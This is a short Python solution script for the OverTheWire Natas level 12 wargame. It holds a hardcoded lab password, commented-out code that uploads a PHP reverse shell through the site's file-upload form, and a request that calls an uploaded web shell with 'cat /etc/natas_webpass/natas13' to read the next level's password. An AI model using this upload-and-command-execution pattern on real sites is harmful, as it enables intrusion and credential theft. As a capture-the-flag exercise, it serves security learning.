import requests
import re

username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

url = f'http://{username}.natas.labs.overthewire.org'

#files = { 'uploadedfile' : open('revshell.php', 'rb') }
#data = { 'filename' : 'revshell.php'}

#response = requests.post(url, auth = (username, password), files = files, data = data)
response = requests.get(url + '/upload/o3pe1tdgai.php?c=cat /etc/natas_webpass/natas13', auth = (username, password))
content = response.text

print(re.findall('(.*)\n', content)[0])